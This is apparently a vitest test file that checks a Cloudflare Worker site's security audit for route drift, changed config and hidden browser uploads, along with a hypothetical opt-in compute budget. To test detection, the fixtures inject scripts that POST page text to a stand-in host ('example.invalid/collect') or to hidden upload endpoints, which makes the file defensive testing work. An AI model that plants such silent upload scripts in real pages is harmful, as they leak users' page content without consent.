import { readFileSync } from "node:fs";
import { resolve } from "node:path";
import { describe, expect, it } from "vitest";
import {
  auditStaticSurface, evaluateCandidateBudget, routesFromWorker, transportFingerprintFailure,
  type CandidateBudget,
} from "../scripts/feasibility-server-optin-348";

const project = resolve(import.meta.dirname, "..");
const source = (path: string) => readFileSync(resolve(project, path), "utf8");

const baselineBudget: CandidateBudget = {
  informedConsent: true, explicitAction: true, perJobDisclosure: true,
  expectedBytes: 2048, maxInputBytes: 1024 * 1024,
  cpuMs: 3, maxCpuMs: 9,
  timeoutMs: 2000, maxTimeoutMs: 4000,
  memoryMiB: 12, maxMemoryMiB: 64,
  dailyRequests: 100, dailyRowsRead: 0, dailyRowsWritten: 0, extraStorageBytes: 0,
  usedDailyRequests: 2000, usedDailyRowsRead: 1000, usedDailyRowsWritten: 200,
  usedStorageBytes: 1024, providerLimitsVerified: true, fallbackLocalAvailable: true,
};

const candidate = (changes: Partial<CandidateBudget> = {}) => evaluateCandidateBudget({ ...baselineBudget, ...changes });

describe("#348 fail-closed source inventory", () => {
  it("audits real Worker code, fixed routes, Cloudflare configuration and client transports", () => {
    const audit = auditStaticSurface(project);
    expect(audit.violations).toEqual([]);
    expect(audit.baselineSafe).toBe(true);
    expect(audit.routes).toHaveLength(19);
    expect(audit.inspectedFiles).toBeGreaterThan(100);
    expect(audit.serverMode).toBe("NO_GO");
  });

  it("rejects new server actions even when the existing routes are preserved", () => {
    const worker = source("worker/index.ts");
    const altered = worker.replace(
      '  { pattern: "/api/vies/check", method: "POST", handle: handleViesCheck },',
      '  { pattern: "/api/vies/check", method: "POST", handle: handleViesCheck },\n  { pattern: "/api/process", method: "POST", handle: handleViesCheck },',
    );
    expect(altered).not.toBe(worker);
    expect(routesFromWorker(altered)).toContain("POST /api/process");
    const audit = auditStaticSurface(project, (path) => path === "worker/index.ts" ? altered : source(path));
    expect(audit.violations).toContain("SERVER_ROUTE_DRIFT");
    expect(audit.violations).toContain("CHANGED_WORKER_SOURCE:worker/index.ts");
  });
  it("rebinds only the independently reviewed #328 staging/KDF bytes and rejects either hostile drift", () => {
    const auth = source("worker/auth.ts");
    expect(auth).toContain("MAX_NATIVE_WORKER_PBKDF2_ITERATIONS = 100_000");
    expect(auth).toContain("pbkdf2Async(sha256, encoder.encode(password), salt");
    const staging = source("worker/wrangler.staging.jsonc");
    expect(staging).toContain('"routes": []');
    expect(staging).toContain('"database_name": "strumentini-328-staging-20261015"');
    expect(staging).not.toContain("3351c8bf-31fc-4716-9d92-2b07c4d8fd2a");
    const changedWorker = auth.replace("MAX_NATIVE_WORKER_PBKDF2_ITERATIONS = 100_000", "MAX_NATIVE_WORKER_PBKDF2_ITERATIONS = 1_000_000");
    expect(changedWorker).not.toBe(auth);
    expect(auditStaticSurface(project, (path) => path === "worker/auth.ts" ? changedWorker : source(path)).violations)
      .toContain("CHANGED_WORKER_SOURCE:worker/auth.ts");
    const changedConfig = staging.replace('"routes": []', '"routes": [{"pattern":"strumentini.it","custom_domain":true}]');
    expect(changedConfig).not.toBe(staging);
    expect(auditStaticSurface(project, (path) => path === "worker/wrangler.staging.jsonc" ? changedConfig : source(path)).violations)
      .toContain("CHANGED_WORKER_SOURCE:worker/wrangler.staging.jsonc");
  });

  it("rejects hidden uploads injected into a previously reviewed client transport", () => {
    const path = "src/components/tools/research-knowledge/ViesVerificationPanel.tsx";
    const changed = `${source(path)}\nvoid fetch('/api/upload', { method: 'POST', body: new FormData() });\n`;
    const audit = auditStaticSurface(project, (p) => p === path ? changed : source(p));
    expect(audit.violations).toContain(`CHANGED_BROWSER_TRANSPORT:${path}`);
    expect(audit.baselineSafe).toBe(false);
  });

  it("preserves the reviewed /preferiti GET-only auth transport and catches later hidden uploads", () => {
    const path = "src/pages/preferiti.astro";
    const reviewed = source(path);
    expect((reviewed.match(/fetch\s*\(/gu) ?? []).length).toBe(1);
    expect(reviewed).toContain('fetch("/api/auth/session", { credentials: "same-origin"');
    expect(transportFingerprintFailure(path, reviewed)).toBeNull();
    const changed = reviewed + '\n<script>void fetch("/api/private-upload", { method: "POST", body: document.body.textContent });</script>\n';
    expect(transportFingerprintFailure(path, changed)).toBe(`CHANGED_BROWSER_TRANSPORT:${path}`);
  });

  it("reviews the #328 logout confirmation without granting any new transport surface", () => {
    const path = "src/components/account/AccountChip.astro";
    const reviewed = source(path);
    expect((reviewed.match(/\bfetch\s*\(/gu) ?? []).length).toBe(2);
    expect(reviewed).toContain('fetch("/api/auth/session", { credentials: "same-origin"');
    expect(reviewed).toContain('fetch("/api/auth/logout", { method: "POST", credentials: "same-origin"');
    expect(reviewed).toContain('if (response.status !== 204) throw new Error(');
    expect(transportFingerprintFailure(path, reviewed)).toBeNull();
    for (const altered of [
      reviewed.replace('fetch("/api/auth/logout"', 'fetch("/api/hidden-upload"'),
      reviewed + '\n<script>fetch("https://example.invalid/collect", {method:"POST",body:document.body.textContent});</script>',
    ]) {
      expect(transportFingerprintFailure(path, altered)).toBe(`CHANGED_BROWSER_TRANSPORT:${path}`);
    }
  });

  it("rejects new browser endpoints through fetch, beacon, XHR and dynamic bracket access", () => {
    const path = "src/components/tools/NewUploader.tsx";
    for (const injected of [
      'fetch("/api/compute", { method: "POST", body: document.body.textContent })',
      'navigator.sendBeacon("/api/telemetry", file)',
      'new XMLHttpRequest().open("POST", "/api/upload")',
      'window["fetch"]("/api/upload", {body: file})',
      'new WebSocket("wss://other.example")',
    ]) {
      expect(transportFingerprintFailure(path, injected)).toBe(`UNREVIEWED_BROWSER_TRANSPORT:${path}`);
    }
  });

  it("rejects a new Cloudflare billing surface including worker-first static routing", () => {
    const changed = source("wrangler.jsonc").replace('"html_handling": "auto-trailing-slash"',
      '"html_handling": "auto-trailing-slash", "run_worker_first": true');
    const audit = auditStaticSurface(project, (path) => path === "wrangler.jsonc" ? changed : source(path));
    expect(audit.violations).toContain("WRANGLER_CONFIG_DRIFT");
  });
});

describe("#348 hypothetical opt-in budget only, with local/unavailable refusal", () => {
  it("can calculate a bounded paper-only scenario without activating the server", () => {
    expect(candidate()).toEqual({ outcome: "BUDGET_ONLY", fallback: "local", reasons: [] });
  });

  it("never treats login, a saved preference or a missing disclosure as per-job consent", () => {
    for (const change of [{ informedConsent: false }, { explicitAction: false }, { perJobDisclosure: false }]) {
      const result = candidate(change);
      expect(result.outcome).toBe("NO_GO");
      expect(result.reasons).toContain("CONSENT_NOT_ESTABLISHED");
      expect(result.fallback).toBe("local");
    }
  });

  it("refuses every missing account-wide quota measurement, even with free published limits", () => {
    for (const field of ["usedDailyRequests", "usedDailyRowsRead", "usedDailyRowsWritten", "usedStorageBytes"] as const) {
      const result = candidate({ [field]: null });
      expect(result.outcome).toBe("NO_GO");
      expect(result.reasons).toContain("BUDGET_OR_ACCOUNT_USAGE_UNKNOWN");
    }
    expect(candidate({ providerLimitsVerified: false }).reasons).toContain("PROVIDER_LIMITS_UNVERIFIED");
  });

  it("refuses all four over-quota dimensions without invoking any provider", () => {
    for (const [changes, violation] of [
      [{ usedDailyRequests: 99_950 }, "WORKER_OVER_FREE_QUOTA"],
      [{ usedDailyRowsRead: 5_000_000, dailyRowsRead: 1 }, "D1_READ_OVER_FREE_QUOTA"],
      [{ usedDailyRowsWritten: 100_000, dailyRowsWritten: 1 }, "D1_WRITE_OVER_FREE_QUOTA"],
      [{ usedStorageBytes: 5_000_000_000, extraStorageBytes: 1 }, "D1_STORAGE_OVER_FREE_QUOTA"],
    ] as const) {
      const result = candidate(changes);
      expect(result.outcome).toBe("NO_GO");
      expect(result.reasons).toContain(violation);
      expect(result.fallback).toBe("local");
    }
  });

  it("refuses oversized files, timeout, CPU, memory and invalid stress inputs", () => {
    for (const changes of [
      { expectedBytes: 1024 * 1024 + 1 }, { expectedBytes: -1 }, { dailyRequests: 0 },
      { cpuMs: 11 }, { maxCpuMs: 11 }, { timeoutMs: 5000 },
      { memoryMiB: 121 }, { usedDailyRequests: Number.NaN }, { usedDailyRequests: 1.5 },
    ]) expect(candidate(changes).outcome).toBe("NO_GO");
  });

  it("falls back to unavailable when local processing cannot support a failed server proposal", () => {
    expect(candidate({ fallbackLocalAvailable: false, usedDailyRequests: null })).toEqual({
      outcome: "NO_GO", fallback: "unavailable", reasons: ["BUDGET_OR_ACCOUNT_USAGE_UNKNOWN"],
    });
  });
});
